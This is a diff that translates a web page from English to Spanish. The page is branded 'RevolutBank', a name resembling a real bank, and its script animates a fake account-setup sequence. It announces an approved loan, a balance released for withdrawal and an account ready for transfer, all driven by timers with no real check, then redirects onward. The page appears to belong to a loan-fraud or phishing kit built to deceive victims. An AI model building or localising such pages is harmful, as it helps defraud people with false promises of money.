@@ -20,7 +20,7 @@
 </script>
 <meta charset="utf-8"/>
 <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport"/>
-<title>RevolutBank — Setting Up Your Account</title>
+<title>RevolutBank — Configurando Tu Cuenta</title>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&amp;family=Outfit:wght@400;500;600;700;800&amp;family=Sora:wght@600;700;800&amp;family=Plus+Jakarta+Sans:wght@400;500;600;700;800&amp;family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
 <style>
     * {
@@ -308,8 +308,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 </div>
 <!-- GREETING -->
 <div class="greeting">
-<span>Hello,</span>
-<h1 id="userName">Customer</h1>
+<span>¡Hola,</span>
+<h1 id="userName">Cliente</h1>
 </div>
 <!-- SPINNER -->
 <div class="spinner-area">
@@ -322,25 +322,25 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 <div class="check-icon"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
 </svg></div>
-<span class="check-text"><span data-msg="configurando.t03">Account created successfully</span></span>
+<span class="check-text"><span data-msg="configurando.t03">Cuenta creada exitosamente</span></span>
 </div>
 <div class="check-item" id="step2">
 <div class="check-icon"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
 </svg></div>
-<span class="check-text"><span data-msg="configurando.t04">Préstamo aprobado and available</span></span>
+<span class="check-text"><span data-msg="configurando.t04">Préstamo aprobado y disponible</span></span>
 </div>
 <div class="check-item" id="step3">
 <div class="check-icon"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
 </svg></div>
-<span class="check-text"><span data-msg="configurando.t05">Balance released for withdrawal</span></span>
+<span class="check-text"><span data-msg="configurando.t05">Saldo liberado para retiro</span></span>
 </div>
 <div class="check-item" id="step4">
 <div class="check-icon"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
 </svg></div>
-<span class="check-text"><span data-msg="configurando.t06">Account ready for transfer</span></span>
+<span class="check-text"><span data-msg="configurando.t06">Cuenta lista para transferencia</span></span>
 </div>
 </div>
 <!-- PROGRESS BAR -->
@@ -348,12 +348,12 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 <div class="progress-bar">
 <div class="progress-fill" id="progFill"></div>
 </div>
-<div class="progress-label" id="progLabel">Getting everything ready for you...</div>
+<div class="progress-label" id="progLabel">Preparando todo para ti...</div>
 </div>
 </div>
 <!-- FOOTER -->
 <div class="splash-foot">
-<p>RevolutBank — Con sede en Ciudad de México<br/>Secure environment with SSL encryption</p>
+<p>RevolutBank — Con sede en Ciudad de México<br/>Entorno seguro with SSL encryption</p>
 </div>
 <script>
     // Load user name
@@ -370,10 +370,10 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
     const messages = [
       'Configurando tu cuenta',
-      'Verifying data',
-      'Activating loan',
-      'Preparing environment',
-      'Almost ready...'
+      'Verificando datos',
+      'Activando préstamo',
+      'Preparando entorno',
+      'Casi listo...'
     ];
 
     // Animate steps one by one
@@ -389,8 +389,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
         setTimeout(nextStep, 1800);
       } else {
         // All done - redirect
-        label.textContent = 'Ready! Redirecting...';
-        statusText.textContent = 'All set!';
+        label.textContent = '¡Listo! Redirigiendo...';
+        statusText.textContent = '¡Todo listo!';
         setTimeout(() => {
           const p = new URLSearchParams(window.location.search);
           window.location.href = 'conta.html' + (p.toString() ? '?' + p : '');
